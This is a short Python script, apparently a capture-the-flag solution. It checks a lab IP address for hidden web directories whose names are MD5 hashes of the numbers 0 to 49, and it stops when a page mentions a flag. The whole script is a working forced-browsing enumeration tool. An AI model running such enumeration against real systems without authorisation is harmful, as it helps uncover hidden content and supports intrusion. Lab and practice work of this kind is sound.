import requests
import time
import sys
import hashlib

# IP address (update this to your target IP)
ip = "10.10.205.16"

def md5(string):
    return hashlib.md5(string.encode()).hexdigest()

def check_directory(number):
    directory = md5(str(number))
    url = f"http://{ip}/{directory}"
    print(f"Checking URL: {url}")
    
    try:
        response = requests.get(url, timeout=5)
        return response.status_code, response.text
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None, None

def main():
    print("Starting scan...")

    for i in range(50):  # Checking first 50 numbers
        print(f"\nChecking directory {i}...")
        status, content = check_directory(i)
        
        if status is None:
            print("Error (connection failed)")
        else:
            print(f"Status: {status}")
            if content and len(content) > 0:
                print(f"Content (first 100 chars): {content[:100]}...")
                if 'flag' in content.lower():
                    print("FLAG FOUND IN THIS DIRECTORY!")
                    print(f"Full content: {content}")
                    return
            else:
                print("No content or empty response")
        
        time.sleep(1)  # 1-second delay between requests

    print("\nScan complete. No flag found.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
